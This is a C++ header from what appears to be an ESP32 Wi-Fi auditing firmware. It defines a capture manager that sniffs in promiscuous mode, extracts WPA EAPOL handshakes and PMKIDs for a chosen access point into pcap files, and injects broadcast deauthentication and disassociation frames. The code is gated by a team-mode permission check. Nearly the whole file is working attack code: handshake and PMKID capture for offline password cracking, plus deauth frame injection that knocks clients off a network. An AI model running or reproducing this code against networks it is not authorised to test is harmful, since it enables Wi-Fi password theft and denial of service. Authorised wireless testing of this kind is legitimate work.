#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "PcapWriter.h"
#include "../core/TeamModeManager.h"
#include "../targets/TargetManager.h"

namespace dirk {
enum class CaptureKind:uint8_t { None=0,Eapol,Pmkid,Handshake,Raw };

class CaptureManager {
public:
  void begin(StorageManager* s,TeamModeManager* m){ storage=s; mode=m; instance=this; }
  bool mayCapture(const WifiTarget& t) const { return storage && storage->mounted() && mode && mode->permitsActive(t); }
  bool active() const { return running; }
  CaptureKind kind() const { return captureKind; }
  uint32_t packets() const { return packetCount; }
  uint32_t eapolFrames() const { return eapolCount; }
  uint32_t pmkids() const { return pmkidCount; }
  const char* path() const { return capturePath; }

  bool start(const WifiTarget& t,CaptureKind k){
    if(!mayCapture(t) || t.band!=Band::Band24 || t.channel<1 || t.channel>14) return false;
    stop(); target=t; captureKind=k; packetCount=eapolCount=pmkidCount=0;
    snprintf(capturePath,sizeof(capturePath),"/dirk/captures/%02X%02X%02X%02X%02X%02X_%s.pcap",
      t.bssid.b[0],t.bssid.b[1],t.bssid.b[2],t.bssid.b[3],t.bssid.b[4],t.bssid.b[5],
      k==CaptureKind::Pmkid?"pmkid":"handshake");
    if(!pcap.begin(*storage,capturePath,105)) return false;
    WiFi.mode(WIFI_STA); esp_wifi_set_channel(t.channel,WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t filter{}; filter.filter_mask=WIFI_PROMIS_FILTER_MASK_MGMT|WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&CaptureManager::rxThunk);
    if(esp_wifi_set_promiscuous(true)!=ESP_OK) return false;
    running=true; return true;
  }

  void stop(){ if(running) esp_wifi_set_promiscuous(false); running=false; captureKind=CaptureKind::None; }

  bool deauthBurst(const WifiTarget& t,uint8_t count=3){ return mgmtTestBurst(t,0xC0,count); }
  bool disassocBurst(const WifiTarget& t,uint8_t count=3){ return mgmtTestBurst(t,0xA0,count); }

private:
  StorageManager* storage=nullptr; TeamModeManager* mode=nullptr; PcapWriter pcap;
  WifiTarget target{}; volatile bool running=false; volatile uint32_t packetCount=0,eapolCount=0,pmkidCount=0;
  CaptureKind captureKind=CaptureKind::None; char capturePath[112]{};
  static CaptureManager* instance;
  static void rxThunk(void* buf,wifi_promiscuous_pkt_type_t type){ if(instance) instance->onRx(buf,type); }
  bool hasTarget(const uint8_t* p,uint16_t n){
    if(n<24) return false; return !memcmp(p+4,target.bssid.b,6)||!memcmp(p+10,target.bssid.b,6)||!memcmp(p+16,target.bssid.b,6);
  }
  bool isEapol(const uint8_t* p,uint16_t n){
    if(n<32) return false; uint8_t fc0=p[0],fc1=p[1]; if((fc0&0x0c)!=0x08) return false;
    uint16_t h=24; if((fc0&0x80)!=0) h+=2; if((fc1&0x03)==0x03) h+=6;
    if(n<h+8) return false; const uint8_t* q=p+h;
    return q[0]==0xAA&&q[1]==0xAA&&q[2]==0x03&&q[6]==0x88&&q[7]==0x8E;
  }
  bool hasPmkid(const uint8_t* p,uint16_t n){
    if(n<30 || (p[0]&0x0c)!=0x00) return false;
    uint8_t st=(p[0]>>4)&0x0f; if(st!=0 && st!=2) return false; // assoc/reassoc request
    uint16_t pos=(st==0)?28:34; if(pos>=n) return false;
    while(pos+2<=n){ uint8_t id=p[pos],len=p[pos+1]; pos+=2; if(pos+len>n) break;
      if(id==48 && len>=20){
        const uint8_t* r=p+pos; size_t x=2+4; if(x+2>len){pos+=len;continue;}
        uint16_t pc=r[x]|(r[x+1]<<8); x+=2+4*pc; if(x+2>len){pos+=len;continue;}
        uint16_t ac=r[x]|(r[x+1]<<8); x+=2+4*ac; if(x+2>len){pos+=len;continue;}
        x+=2; if(x+2<=len){ uint16_t kc=r[x]|(r[x+1]<<8); if(kc>0 && x+2+16<=len) return true; }
      } pos+=len;
    } return false;
  }
  bool mgmtTestBurst(const WifiTarget& t,uint8_t subtype,uint8_t count){
    if(!mayCapture(t) || t.band!=Band::Band24 || t.channel<1 || t.channel>14) return false;
    count=constrain((int)count,1,5);
    WiFi.mode(WIFI_STA); if(esp_wifi_set_channel(t.channel,WIFI_SECOND_CHAN_NONE)!=ESP_OK) return false;
    uint8_t frame[26]={0}; frame[0]=subtype;
    memset(frame+4,0xFF,6); memcpy(frame+10,t.bssid.b,6); memcpy(frame+16,t.bssid.b,6); frame[24]=0x07; frame[25]=0x00;
    bool ok=true; for(uint8_t i=0;i<count;i++){ if(esp_wifi_80211_tx(WIFI_IF_STA,frame,sizeof(frame),false)!=ESP_OK) ok=false; delay(12); }
    return ok;
  }
  void onRx(void* buf,wifi_promiscuous_pkt_type_t type){
    if(!running || !buf) return; auto* pkt=(wifi_promiscuous_pkt_t*)buf; uint16_t n=pkt->rx_ctrl.sig_len;
    if(n>4) n-=4; if(n<24 || !hasTarget(pkt->payload,n)) return;
    bool ep=isEapol(pkt->payload,n), pm=hasPmkid(pkt->payload,n);
    if(captureKind==CaptureKind::Pmkid && !pm) return;
    uint32_t us=micros(); pcap.packet(pkt->payload,n,us/1000000,us%1000000); packetCount++;
    if(ep) eapolCount++; if(pm) pmkidCount++;
  }
};
inline CaptureManager* CaptureManager::instance=nullptr;
}
